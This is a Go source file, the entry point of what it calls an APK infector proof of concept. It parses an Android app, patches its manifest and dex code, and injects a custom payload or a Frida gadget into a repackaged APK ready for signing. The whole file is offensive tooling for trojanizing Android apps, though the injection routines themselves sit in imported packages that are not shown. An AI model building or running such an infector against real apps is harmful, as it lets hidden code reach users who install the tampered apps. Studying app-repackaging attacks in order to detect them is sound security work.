// author: Thatskriptkid (www.orderofsixangles.com)
// You can use my kaitai struct for binary manifest.
// https://github.com/thatskriptkid/Kaitai-Struct-Android-Manifest-binary-XML

package main

import (
	"encoding/xml"
	"fmt"
	"log"
	"os"
	
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/injector"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/dex"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
	
)

var help_str = "Usage:\nmain input.apk output.apk -o [option]\noptions:\n\t1 - custom payload\n\t2 - frida inject"

func main() {

	//setup logging
	logFile, err := os.OpenFile("apkinfector.log", os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}

	defer logFile.Close()

	log.SetOutput(logFile)

	if os.Args[1] == "-h" {
		fmt.Println(help_str)
		return
	}

	if len(os.Args) < 5 || (os.Args[4] != "1" && os.Args[4] != "2") {
		fmt.Println(help_str)
		return
	}

	if os.Args[4] == "1" {
		utils.Payload_option = int(utils.Custom_payload)
	} else if os.Args[4] == "2" {
		utils.Payload_option = int(utils.Frida_payload)
	}

	// if !(isValidFile(os.Args[1]) && isValidFile(os.Args[2])) {
	// 	fmt.Printf("Invalid file path %s %s", os.Args[1], os.Args[2])
	// 	return
	// }

	manifestPlainFile, err := os.Create(manifest.PlainPath) // create/truncate the file
	if err != nil {
		log.Panic("Failed to create AndroidManifest plaintext", err)
	}

	enc := xml.NewEncoder(manifestPlainFile)

	enc.Indent("", "\t")

	fmt.Println("Parsing APK...")
	manifest.ParseApk(os.Args[1], enc)

	//close before reading
	manifestPlainFile.Close()

	fmt.Println("Patching APK")
	fmt.Println("\t--Patching manifest...")
	manifest.Patch()

	fmt.Println("\t--Patching dex...")
	dex.Patch()

	fmt.Println("Injecting...")
	injector.Inject(os.Args[1], os.Args[2])

	utils.Cleanup()

	fmt.Println("Done! Now you should sign your apk")
}
